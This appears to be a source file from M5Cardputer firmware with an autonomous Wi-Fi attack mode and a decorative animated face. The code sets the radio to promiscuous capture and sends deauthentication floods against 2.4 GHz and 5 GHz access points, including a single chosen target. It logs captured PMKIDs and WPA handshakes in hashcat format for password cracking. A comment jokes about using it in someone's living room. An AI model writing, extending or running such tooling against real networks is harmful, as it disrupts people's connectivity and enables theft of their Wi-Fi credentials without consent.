    uint16_t visor = 0x0000;

    /* Helmet: rounded rectangle with notch. */
    d.fillRoundRect(cx - 24, cy - 20, 48, 40, 6, dark);
    d.drawRoundRect(cx - 24, cy - 20, 48, 40, 6, glow);
    /* Visor band across eyes. */
    d.fillRect(cx - 22, cy - 8, 44, 14, visor);
    d.drawRect(cx - 22, cy - 8, 44, 14, glow);
    /* Chin vent slits. */
    for (int i = 0; i < 3; i++)
        d.drawFastHLine(cx - 6 + i * 4, cy + 12, 3, glow);

    /* Trident crown — glowing, animated pulse. */
    uint8_t pulse = ((tick / 100) % 10);
    uint16_t crown_c = (pulse < 5) ? glow : glow2;
    d.drawFastVLine(cx, cy - 28, 12, crown_c);
    d.fillTriangle(cx, cy - 30, cx - 2, cy - 26, cx + 2, cy - 26, crown_c);
    d.drawFastVLine(cx - 7, cy - 24, 8, crown_c);
    d.fillTriangle(cx - 7, cy - 26, cx - 9, cy - 22, cx - 5, cy - 22, crown_c);
    d.drawFastVLine(cx + 7, cy - 24, 8, crown_c);
    d.fillTriangle(cx + 7, cy - 26, cx + 5, cy - 22, cx + 9, cy - 22, crown_c);
    /* Trident crossbar. */
    d.drawFastHLine(cx - 9, cy - 20, 19, crown_c);

    /* Visor eyes — inside the black visor band. */
    int ey = cy - 2;
    int el = cx - 10, er = cx + 10;
    switch (m) {
    case MOOD_SLEEPY: {
        /* Dim horizontal lines — drowsy scanner bars. */
        bool blink = ((tick / 600) & 1);
        uint16_t ec = blink ? 0x2104 : glow;
        d.drawFastHLine(el - 4, ey, 8, ec);
        d.drawFastHLine(er - 4, ey, 8, ec);
        break;
    }
    case MOOD_HUNTING: {
        /* Scanning pupils — slide left to right. */
        int scan = (tick / 150) % 8;
        d.fillRect(el - 4, ey - 2, 8, 5, glow);
        d.fillRect(er - 4, ey - 2, 8, 5, glow);
        d.fillRect(el - 4 + scan, ey - 1, 2, 3, 0xFFFF);
        d.fillRect(er - 4 + scan, ey - 1, 2, 3, 0xFFFF);
        break;
    }
    case MOOD_HUNGRY: {
        /* Half-lidded — top half dimmed. */
        d.fillRect(el - 4, ey - 1, 8, 3, 0x2104);
        d.fillRect(er - 4, ey - 1, 8, 3, 0x2104);
        d.fillRect(el - 3, ey, 6, 2, glow);
        d.fillRect(er - 3, ey, 6, 2, glow);
        break;
    }
    case MOOD_STOKED: {
        /* Star-burst eyes — bright and pulsing. */
        uint16_t sc = ((tick / 80) & 1) ? 0xFFFF : glow;
        d.fillRect(el - 4, ey - 2, 8, 5, sc);
        d.fillRect(er - 4, ey - 2, 8, 5, sc);
        d.drawPixel(el - 5, ey, sc); d.drawPixel(el + 4, ey, sc);
        d.drawPixel(er - 5, ey, sc); d.drawPixel(er + 4, ey, sc);
        d.drawPixel(el, ey - 3, sc); d.drawPixel(er, ey - 3, sc);
        d.drawPixel(el, ey + 3, sc); d.drawPixel(er, ey + 3, sc);
        break;
    }
    case MOOD_DESPAIR: {
        /* X X — dead/crashed. */
        d.drawLine(el - 3, ey - 2, el + 3, ey + 2, T_BAD);
        d.drawLine(el - 3, ey + 2, el + 3, ey - 2, T_BAD);
        d.drawLine(er - 3, ey - 2, er + 3, ey + 2, T_BAD);
        d.drawLine(er - 3, ey + 2, er + 3, ey - 2, T_BAD);
        break;
    }
    case MOOD_FERAL: {
        /* Red alert — glowing red, pulsing fast. */
        uint16_t fc = ((tick / 60) & 1) ? T_BAD : 0xF800;
        d.fillRect(el - 5, ey - 2, 10, 5, fc);
        d.fillRect(er - 5, ey - 2, 10, 5, fc);
        d.fillRect(el - 2, ey - 1, 4, 3, 0xFFFF);
        d.fillRect(er - 2, ey - 1, 4, 3, 0xFFFF);
        /* Angry brow lines on visor. */
        d.drawLine(el - 5, ey - 5, el + 3, ey - 3, T_BAD);
        d.drawLine(er - 3, ey - 3, er + 5, ey - 5, T_BAD);
        break;
    }
    }

    /* Scan-line effect across visor — subtle horizontal lines. */
    for (int sy = cy - 7; sy < cy + 5; sy += 2)
        d.drawFastHLine(cx - 21, sy, 42, 0x0821);

    /* Mouth / status indicator below visor. */
    int mx = cx, my = cy + 10;
    switch (m) {
    case MOOD_SLEEPY:  d.drawFastHLine(mx - 3, my, 6, glow); break;
    case MOOD_HUNTING: {
        /* Animated comm dots. */
        int dot = (tick / 200) % 4;
        for (int i = 0; i < 3; i++)
            d.fillCircle(mx - 4 + i * 4, my, 1, i <= dot ? glow : dark);
        break;
    }
    case MOOD_HUNGRY:  d.drawLine(mx - 4, my + 2, mx + 4, my, glow); break;
    case MOOD_STOKED: {
        /* Wide grin — curved line. */
        for (int i = -6; i <= 6; i++)
            d.drawPixel(mx + i, my + abs(i) / 2, glow);
        break;
    }
    case MOOD_DESPAIR: d.drawLine(mx - 4, my, mx + 4, my + 2, T_BAD); break;
    case MOOD_FERAL:   {
        /* Jagged teeth. */
        for (int i = -5; i <= 5; i += 2) {
            d.drawLine(mx + i, my, mx + i + 1, my + 2, T_BAD);
            d.drawLine(mx + i + 1, my + 2, mx + i + 2, my, T_BAD);
        }
        break;
    }
    }

    /* Glitch effect — random pixels near face on FERAL/STOKED. */
    if (m == MOOD_FERAL || m == MOOD_STOKED) {
        for (int g = 0; g < 4; g++) {
            int gx = cx - 28 + (esp_random() % 56);
            int gy = cy - 22 + (esp_random() % 44);
            d.drawPixel(gx, gy, (m == MOOD_FERAL) ? T_BAD : glow);
        }
    }
}

/* Mode picker — cursor over 4 cards, ENTER selects, ESC bails. */
static bool pick_mode(void)
{
    auto &d = M5Cardputer.Display;
    int sel = (int)s_mode;
    triton_mode_t modes[4] = { TM_HUNT, TM_STEALTH, TM_SURGICAL, TM_STORM };
    ui_draw_footer(";/. pick  ENTER=launch  `=back");
    int prev_sel = -1;   /* sentinel — forces first-iteration render */
    while (true) {
        /* Render FIRST if state dirty, THEN poll input. Previously the
         * render was gated behind an input event, so the main menu
         * stayed on-screen until the user pressed a key — looked like
         * the device froze on Triton select. */
        if (sel != prev_sel || prev_sel < 0) {
            prev_sel = sel;
            ui_force_clear_body();
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("ARGUS MODE");
            d.drawFastHLine(4, BODY_Y + 12, 100, T_ACCENT2);
            for (int i = 0; i < 4; ++i) {
                int y = BODY_Y + 18 + i * 14;
                bool s = (i == sel);
                if (s) {
                    d.fillRoundRect(2, y - 1, SCR_W - 4, 13, 2, T_SEL_BG);
                    d.drawRoundRect(2, y - 1, SCR_W - 4, 13, 2, T_SEL_BD);
                }
                d.setTextColor(s ? T_ACCENT : T_FG, s ? T_SEL_BG : T_BG);
                d.setCursor(6, y);  d.printf("%-8s", mode_name(modes[i]));
                d.setTextColor(s ? T_FG : T_DIM, s ? T_SEL_BG : T_BG);
                d.setCursor(80, y); d.print(mode_blurb(modes[i]));
            }
            ui_draw_footer(";/. pick  ENTER=launch  `=back");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return false;
        if (k == ';' || k == PK_UP)   { if (sel > 0) sel--; }
        if (k == '.' || k == PK_DOWN) { if (sel < 3) sel++; }
        if (k == PK_ENTER) { s_mode = modes[sel]; return true; }
    }
}

/* If SURGICAL, ask user to pick a target AP from the last WiFi scan
 * results (g_last_selected_ap) — falls back to a quick scan. */
static bool pick_surgical_target(void)
{
    extern ap_t g_last_selected_ap;
    extern bool g_last_selected_valid;
    if (g_last_selected_valid) {
        /* s_q/s_visits/s_wins are sized NCH=14 and indexed by channel; a
         * 5 GHz / >13 target would write out of bounds. Local deauth is
         * 2.4 GHz only anyway — reject upper-band targets. */
        uint8_t ch = g_last_selected_ap.channel;
        if (g_last_selected_ap.is_5g || ch < 1 || ch > 13) {
            ui_toast("target not 2.4GHz", T_WARN, 1500);
            return false;
        }
        memcpy(s_target_bssid, g_last_selected_ap.bssid, 6);
        s_target_ch = ch;
        return true;
    }
    ui_toast("scan + pick AP first", T_WARN, 1500);
    return false;
}

void feat_triton(void)
{
#define TRITON_RAM_PROBE(label) \
    Serial.printf("[triton-ram] %-22s total=%u internal=%u dma=%u\n", \
                  label, \
                  (unsigned)ESP.getFreeHeap(), \
                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL), \
                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_DMA))

    TRITON_RAM_PROBE("feat_triton entry");

    /* Pick mode + target BEFORE any irreversible state changes (BTDM
     * release, raw WiFi init). If user ESCs out of the mode picker we
     * don't want to have already killed BLE for the rest of the session.
     * pick_mode() is pure-UI — no radio dependency. */
    if (!pick_mode()) return;
    if (s_mode == TM_SURGICAL && !pick_surgical_target()) return;

    radio_switch(RADIO_WIFI);
    TRITON_RAM_PROBE("after radio_switch");

    /* BTDM release REMOVED 2026-05-26. esp_bt_controller_mem_release is
     * persistent across ESP.restart() — only a physical power cycle
     * restores BT. Releasing it permanently killed every BLE feature
     * for the rest of the session, even after a software reboot. The
     * DMA budget that previously needed BTDM release is now handled
     * via shrunk 4/4 WiFi buffer config in wifi_lean_sta_init(). */

    /* Lean WiFi init via shared helper. Idempotent — if a prior
     * feature (Scan, Clients, etc.) already inited WiFi this session,
     * this is a no-op and we just continue. Buffer config matches
     * what Triton needs (dynamic_tx=8, static_rx=4, ampdu off). */
    bool wifi_ok = wifi_lean_sta_init();
    Serial.printf("[triton] lean_sta_init -> %d\n", (int)wifi_ok);
    /* Park the supplicant. STA mode with an active connect
     * attempt fights raw 80211_tx — the supplicant claims the
     * TX pool for association frames and every raw TX returns
     * ESP_ERR_NO_MEM. Disconnect drops the supplicant to IDLE
     * so our raw frames get the pool. Matches Evil-Cardputer. */
    esp_err_t de = esp_wifi_disconnect();
    Serial.printf("[triton] esp_wifi_disconnect rc=%d\n", (int)de);
    TRITON_RAM_PROBE("after lean wifi_init");

    /* Explicit "waking up" screen — the setup (sd_mount + scanNetworks
     * + gps_begin + promisc config) takes ~1-2 s and users were
     * mashing ENTER again thinking the device froze. Spinner the
     * delay so we look alive. */
    ui_clear_body();
    auto &dsp = M5Cardputer.Display;
    dsp.setTextColor(T_ACCENT, T_BG);
    dsp.setCursor(4, BODY_Y + 6);  dsp.print("ARGUS");
    dsp.setTextColor(T_FG, T_BG);
    dsp.setCursor(4, BODY_Y + 22); dsp.print("waking up...");
    dsp.setTextColor(T_DIM, T_BG);
    dsp.setCursor(4, BODY_Y + 36); dsp.print("seeding APs + SD + GPS");
    ui_radar(SCR_W - 24, BODY_Y + 28, 10, T_ACCENT);
    ui_draw_footer("stand by");

    TRITON_RAM_PROBE("after pick_mode");
    if (!sd_mount()) { ui_toast("SD needed", T_BAD, 1500); return; }
    TRITON_RAM_PROBE("after sd_mount");
    SD.mkdir("/poseidon");
    s_file = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!s_file) { ui_toast("file open fail", T_BAD, 1500); return; }

    triton_learn_load();
    s_pmk = 0; s_hs = 0; s_eapol = 0; s_deauth_frames = 0;
    s_bs_n = 0; s_m1_n = 0;

    /* Seed BSSID→SSID cache from any prior wardrive session. Triton
     * would otherwise emit hashcat lines with blank ESSID until it
     * catches a beacon from scratch — often 15-30 seconds of captures
     * wasted. Seeding closes that gap. */
    if (g_wdr_ap_count > 0 && g_wdr_aps) {
        int seeded = 0;
        int limit = g_wdr_ap_count < BS_N ? g_wdr_ap_count : BS_N;
        for (int i = 0; i < limit; ++i) {
            memcpy(s_bs[i].bssid, g_wdr_aps[i].bssid, 6);
            strncpy(s_bs[i].ssid, g_wdr_aps[i].ssid, sizeof(s_bs[i].ssid) - 1);
            s_bs[i].ssid[sizeof(s_bs[i].ssid) - 1] = '\0';
            seeded++;
        }
        s_bs_n = seeded;
        Serial.printf("[triton] seeded %d BSSID->SSID from wardrive\n", seeded);
    }

    /* Entry-time WiFi.scanNetworks removed — Arduino's scan path
     * internally re-calls esp_netif_create_default_wifi_sta() which
     * asserts because our raw-IDF init above already created the
     * default STA netif. Promiscuous capture (registered below)
     * populates s_bs[] organically within 15-30 s. */
    TRITON_RAM_PROBE("scan skipped");

    s_ch = 1; s_alive = true;
    s_born = millis();
    s_last_catch = s_born;

    /* OPSEC: only power the GPS HAT if the user explicitly opted in (via
     * the GPS Fix / Wardrive enable). Opening Triton must NOT start GPS or
     * geo-tag captures on its own. With GPS off, emit_pmkid / emit_hs see
     * sats == 0 and skip the wardrive coordinate row entirely. */
    if (gps_user_enabled()) gps_begin();

    /* Set TX power once at session entry — moved out of the per-burst
     * wifi_silent_ap_begin path. Evil-Cardputer never touches tx_power
     * mid-session and runs stably. */
    esp_wifi_set_max_tx_power(84);

    /* Promiscuous bring-up. Order: filter → enable → cb → channel.
     * WiFi is init'd by WiFi.mode(WIFI_STA) at feat_triton entry above,
     * so these calls land on a real driver. */
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(cb);
    esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);

    /* Stop ESP-NOW for the Triton session. Any concurrent ESP-NOW
     * TX/RX path destabilises the softAP + promiscuous RX + active
     * deauth combo we run here. RE-ENABLED 2026-06: the C5 link now stays
     * up so Argus also hunts 5 GHz handshakes via the satellite during its
     * 5G phase. The old c5_stop() here was a freeze mitigation — if Argus
     * destabilises, gate the 5G window (s_phase_5g) back off. */
    c5_begin();
    bool c5_online = false;   /* set live from c5_any_online() in the loop */
    uint32_t last_c5_deauth = 0;
    int c5_target_idx = 0;
    (void)last_c5_deauth; (void)c5_target_idx;

    /* Free scan-result buffers if any prior session left them. */
    WiFi.scanDelete();

    /* Cooperative tick state — Bruce/Marauder/Evil-Cardputer pattern.
     * No FreeRTOS task allocated, no BT memory released; the hunt
     * iterates inline from the UI loop below. */
    uint16_t hunt_seq = (uint16_t)(esp_random() & 0x0FFF);
    uint32_t last_hunt = 0;
    uint32_t next_tick = millis();
    s_phase_5g = false;
    uint32_t phase_started = millis();   /* 2.4/5 GHz time-slice clock */
    {
        extern volatile int wifi_deauth_last_rc;
        wifi_deauth_last_rc = -200;   /* cooperative path engaged */
    }
    Serial.printf("[triton] cooperative tick engaged (internal=%u)\n",
                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));

    ui_draw_footer("autonomous  [M]=mute  [?]=help  `=back");

    uint32_t last_draw = 0;
    uint32_t last_mood = 0;
    mood_t   mood = MOOD_SLEEPY;
    /* Force first redraw cycle to do a full clear — wipes menu /
     * pick-mode residue that's still in the framebuffer. */
    s_triton_dirty = true;
    uint32_t stoked_until = 0;
    uint32_t prev_total = 0;

    uint32_t last_overlay_at = 0;
    while (true) {
        c5_online = c5_any_online();   /* live satellite presence */
        /* Time-slice 2.4 GHz (local softAP deauth) and 5 GHz (C5 satellite) so
         * they don't fight for the shared raw-TX path. Enter the 5 GHz window
         * only when a C5 is online; drop straight back to 2.4 GHz the moment it
         * disappears. ~10 s per phase (see the 5 GHz block's rotation timing). */
        {
            uint32_t np = millis();
            if (!c5_online) {
                s_phase_5g = false;
                phase_started = np;
            } else if (np - phase_started >= 10000) {
                s_phase_5g = !s_phase_5g;
                phase_started = np;
            }
        }
        /* Cooperative tick — runs the hop+burst cycle inline. Gated
         * on the per-mode dwell so each channel gets its full window.
         * MUST come before input_poll which has a delay-and-continue
         * fast path that would otherwise skip the tick on most loops. */
        if (millis() >= next_tick) {
            triton_tick(hunt_seq, last_hunt);
            next_tick = millis() + triton_dwell_for_mode(s_mode);
        }

        uint32_t now = millis();
        uint32_t total = s_pmk + s_hs;
        if (total > prev_total) {
            uint32_t diff = total - prev_total;
            prev_total = total;
            stoked_until = now + 5000;
            static uint32_t prev_hs = 0;
            bool was_hs = (s_hs > prev_hs);
            prev_hs = s_hs;
            /* Rate-limit the full-screen overlay to once per 3 s.
             * Without this, cascading captures stacked 1400 ms of
             * blocking overlay each — UI task stuck, user pressed
             * keys that never registered, looked like a freeze. SFX
             * still fires so every catch gets its jingle. */
            sfx_capture();
            if (now - last_overlay_at > 3000) {
                last_overlay_at = now;
                char sub[48];
                snprintf(sub, sizeof(sub), "total: %lu", (unsigned long)total);
                if (was_hs) {
                    ui_action_overlay("HANDSHAKE!", sub, ACT_BG_WAVES, 0xF81F, 900);
                } else {
                    ui_action_overlay("PMKID", sub, ACT_BG_RADAR, 0x07FF, 700);
                }
                /* Overlay drew over Triton's UI — force a full body
                 * clear on the next redraw so its residue doesn't
                 * bleed through behind Argus / counters / bubble. */
                extern bool s_triton_dirty;
                s_triton_dirty = true;
            }
            (void)diff;
        }

        if (now - last_mood > 400) {
            last_mood = now;
            mood = (now < stoked_until) ? MOOD_STOKED : mood_now();
        }

        if (now - last_draw > 120) {
            last_draw = now;
            auto &d = M5Cardputer.Display;
            /* One-shot full clear when the body has been clobbered by
             * something OUTSIDE our normal redraw (menu bleeding through
             * on entry, action-overlay residue, etc). Set via the
             * s_triton_dirty flag — first redraw on entry + every
             * post-capture overlay returns dirty=true. Steady-state
             * redraws skip the clear and rely on each cell's opaque
             * bg color / fixed-width printf to overwrite cleanly. */
            extern bool s_triton_dirty;
            if (s_triton_dirty) {
                ui_clear_body();
                s_triton_dirty = false;
            }

            /* ---- LEFT ZONE: face + speech bubble + uptime ---- */
            /* Argus mood portrait — 64x64 sprite. Argus region is
             * preserved by the partial-clear above; the sprite is
             * cached internally and only re-pushes when state
             * actually changed (mood / sway / blink). */
            {
                argus_mood_t am = ARGUS_WATCHING;
                switch (s_mode) {
                    case TM_STEALTH:  am = ARGUS_REFLECTIVE;  break;
                    case TM_SURGICAL: am = ARGUS_CALCULATING; break;
                    case TM_STORM:    am = ARGUS_OLD_FURY;    break;
                    default: /* TM_HUNT */                    break;
                }
                /* Activity-mood overrides take priority. */
                switch (mood) {
                    case MOOD_SLEEPY:  am = ARGUS_SLEEPING;  break;
                    case MOOD_STOKED:  am = ARGUS_PLEASED;   break;
                    case MOOD_HUNGRY:  am = ARGUS_ANNOYED;   break;
                    case MOOD_DESPAIR: am = ARGUS_RESIGNED;  break;
                    case MOOD_FERAL:   am = ARGUS_OLD_FURY;  break;
                    case MOOD_HUNTING: /* keep mode-derived */ break;
                }
                argus_draw(am, 8, BODY_Y);   /* 96x96 inside preserved rect */
            }
            (void)mood; (void)now;

            /* Speech bubble — voice-line rotation tied to mood +
             * reaction overrides for capture/burst events. */
            const char *w = current_voice(mood);
            int bubble_y = FOOTER_Y - 16;
            d.fillRoundRect(4, bubble_y, 130, 14, 3, 0x10A2);
            d.drawRoundRect(4, bubble_y, 130, 14, 3, T_WARN);
            d.setTextColor(T_WARN, 0x10A2);
            d.setCursor(8, bubble_y + 3);
            /* Truncate to fit the bubble (~20 chars). */
            char buf[24];
            strncpy(buf, w, sizeof(buf) - 1);
            buf[sizeof(buf) - 1] = '\0';
            d.print(buf);
            /* One-shot voice-line log so a serial observer can confirm
             * the bubble is actually being painted with real text. */
            static const char *s_last_logged = nullptr;
            if (w != s_last_logged && w && w[0]) {
                s_last_logged = w;
                Serial.printf("[triton] voice='%s' mood=%d\n", w, (int)mood);
            }

            /* ---- RIGHT ZONE: title + stats + sparkline ---- */
            int rx = 114;

            /* Header: ARGUS + mode + C5 dot. */
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(rx, BODY_Y + 4); d.print("ARGUS");
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(rx + 58, BODY_Y + 4); d.print(mode_name(s_mode));
            if (c5_online) d.fillCircle(236, BODY_Y + 7, 3, T_GOOD);
            d.drawFastHLine(rx, BODY_Y + 14, 122, T_ACCENT);

            /* Channel + TX indicator. Fixed-width %-3u so a digit drop
             * (13 → 6) doesn't leave the "3" visible (was rendering
             * like "ch: 63" / "ch: 80" with stale digits). */
            d.setTextColor(T_FG, T_BG);
            d.setCursor(rx, BODY_Y + 18); d.printf("ch: %-3u", (unsigned)s_ch);
            /* Blink TX dot when in an active deauth mode. */
            if (s_mode != TM_STEALTH && ((now / 250) & 1))
                d.fillCircle(rx + 50, BODY_Y + 21, 2, T_BAD);
            if (s_mode == TM_STEALTH)
                d.setCursor(rx + 46, BODY_Y + 18), d.setTextColor(T_DIM, T_BG), d.print("RX");

            /* APs + deauth frame counter — fixed-width formats so the
             * char-bg from setTextColor overwrites any prior digits.
             * No fillRect needed → no clear-redraw flicker. */
            d.setTextColor(T_FG, T_BG);
            d.setCursor(rx, BODY_Y + 28); d.printf("APs: %-3d", (int)s_bs_n);
            d.setTextColor(s_deauth_frames > 0 ? T_BAD : T_DIM, T_BG);
            d.setCursor(rx, BODY_Y + 38);
            d.printf("TX:  %-9lu", (unsigned long)s_deauth_frames);

            /* rc indicator — sentinels tell us which gate is blocking.
             *  -999 = never reached the burst window predicate
             *         (hop_task crashed, or mode/phase gating off)
             *  -100 = entered burst window but BSSID branch skipped
             *  -101 = entered burst window, BSSID cache was empty
             *  -OTHER = real return code from esp_wifi_80211_tx
             *           (0=OK, 257=NO_MEM, 258=INVALID_ARG, 12289=NOT_INIT) */
            if (s_deauth_frames == 0) {
                extern volatile int wifi_deauth_last_rc;
                int last_rc = wifi_deauth_last_rc;
                d.setTextColor(T_WARN, T_BG);
                d.setCursor(rx + 50, BODY_Y + 38);
                /* Sentinel decoder:
                 *   -999 = hop_task NEVER ran (xTaskCreate fail)
                 *   -200 = hop_task started, while loop never entered
                 *   -50  = while loop iterates, predicate never satisfied
                 *   -100 = predicate OK, entered burst window
                 *   -101 = entered window, BSSID cache empty
                 *   other = real esp_wifi_80211_tx rc */
                if      (last_rc == -999) d.print("nostart ");
                else if (last_rc <= -1000) d.printf("xTC%dKB ", -(last_rc + 1000));  /* shows internal RAM kB at failure */
                else if (last_rc == -300) d.print("xTC-fail");
                else if (last_rc == -201) d.print("spawned ");
                else if (last_rc == -200) d.print("no-loop ");
                else if (last_rc == -50)  d.print("no-pred ");
                else if (last_rc == -100) d.print("win-skip");
                else if (last_rc == -101) d.print("no-bss  ");
                else                      d.printf("rc=%-5d", last_rc);
            }
            /* hop_task iteration counter — if this stays at the same
             * value across redraws, hop_task has crashed or hung and
             * we know to look there. If it climbs but TX stays 0, the
             * issue is downstream in the deauth path. */
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(rx, BODY_Y + 96);
            d.printf("it: %-6lu", (unsigned long)s_hop_iter);

            d.setTextColor(s_pmk > 0 ? T_GOOD : T_DIM, T_BG);
            d.setCursor(rx, BODY_Y + 48); d.printf("PMK: %-9lu", (unsigned long)s_pmk);

            /* HS — the hero stat. Flash row on capture. */
            static uint32_t hs_flash_until = 0;
            if (s_hs > 0 && now < stoked_until) hs_flash_until = now + 500;
            bool hs_flash = (now < hs_flash_until) && ((now / 100) & 1);
            if (hs_flash) d.fillRect(rx - 2, BODY_Y + 56, 126, 12, T_ACCENT);
            d.setTextColor(hs_flash ? T_BG : (s_hs > 0 ? T_ACCENT : T_FG),
                           hs_flash ? T_ACCENT : T_BG);
            d.setCursor(rx, BODY_Y + 58); d.printf("HS:  %-9lu", (unsigned long)s_hs);

            /* Channel quality sparkline — 13 bars for the RL brain. */
            int spark_y = BODY_Y + 74;
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(rx, spark_y - 8); d.print("RL:");
            for (int i = 1; i <= 13; i++) {
                int bx = rx + 20 + (i - 1) * 8;
                int bh = (int)(s_q[i] * 12);
                if (bh < 1) bh = 1;
                if (bh > 12) bh = 12;
                uint16_t bc = (i == (int)s_ch) ? T_ACCENT : T_DIM;
                d.fillRect(bx, spark_y + 12 - bh, 6, bh, bc);
                d.drawRect(bx, spark_y, 6, 12, 0x2104);
            }

            ui_draw_status("wifi", "triton");
        }

        /* 5 GHz attack window: fire C5 commands. Only runs during
         * phase_5g so we're not competing with softAP deauth TX for
         * buffers. Rotate every 6 s inside the 10 s window → ~1 target
         * hit per 5G phase, every ~20 s cycle. */
        if (s_phase_5g && c5_online && now - last_c5_deauth > 6000) {
            last_c5_deauth = now;
            c5_ap_t aps[64];
            int n = c5_aps(aps, 64);
            int five_n = 0;
            for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
            if (five_n > 0) {
                const c5_ap_t &t = aps[c5_target_idx % five_n];
                /* HS capture first so the C5 is already listening when
                 * the deauth storm forces the re-auth. */
                c5_cmd_hs(t.bssid, t.channel, 5000);
                c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
                c5_target_idx++;
            } else {
                c5_clear_results();
                c5_cmd_scan_5g(400);
            }
        }

        /* Drain RESP_HS tuples from the C5 into the hashcat log. This
         * runs every loop regardless of phase — if the C5 captured a
         * handshake during its window we want to flush it ASAP. */
        if (c5_online) {
            c5_hs_t hs[4];
            int nh = c5_hss(hs, 4);
            for (int i = 0; i < nh; ++i) {
                char ssid[33] = {0};
                ssid_of(hs[i].bssid, ssid, sizeof(ssid));

                /* Compose WPA*02* line — same format as local emit_hs. */
                char line[1024] = "WPA*02*";
                hexcat(line, hs[i].mic, 16);    strcat(line, "*");
                hexcat(line, hs[i].bssid, 6);   strcat(line, "*");
                hexcat(line, hs[i].sta, 6);     strcat(line, "*");
                for (size_t k = 0; k < strlen(ssid); ++k) {
                    char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[k]);
                    strcat(line, h);
                }
                strcat(line, "*");
                hexcat(line, hs[i].anonce, 32); strcat(line, "*");
                int m2 = hs[i].eapol_m2_len;
                if (m2 > 128) m2 = 128;
                if (m2 < 0)   m2 = 0;
                hexcat(line, hs[i].eapol_m2, m2);
                strcat(line, "*02\n");
                capture_enqueue(line);
                wdr_append(hs[i].bssid, ssid, "EAPOL_HS_5G");
                s_hs++;
            }
            /* Don't auto-rescan on every HS drain. Frequent HS arrivals
             * were firing c5_cmd_scan_5g 7+ times in 20 s, saturating
             * ESP-NOW TX path. The normal rotation loop above refreshes
             * the 5G AP list on its own cadence. */
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == '?') { ui_show_current_help(); }
        if (k == 'm' || k == 'M') {
            /* Toggle global SFX mute in-session. Captures keep firing
             * — just without the jingle — for when you're hunting in
             * someone's living room and don't want POSEIDON chirping
             * "HANDSHAKE!" every two minutes. */
            bool m = !sfx_is_muted();
            sfx_set_mute(m);
            ui_toast(m ? "muted" : "sound on", m ? T_WARN : T_GOOD, 600);
        }
    }

    s_alive = false;
    /* Disable RX BEFORE the final flush so the WiFi-task cb can't enqueue a
     * new handshake after we've drained the queue (it would never reach SD). */
    esp_wifi_set_promiscuous(false);
    delay(30);   /* let any in-flight cb finish */
    capture_flush();
    wdr_flush();
    triton_learn_save();
    if (s_file)     { s_file.flush();     s_file.close(); }
    if (s_wdr_file) { s_wdr_file.flush(); s_wdr_file.close(); }
    gps_end();
    c5_begin();
    delay(200);
}
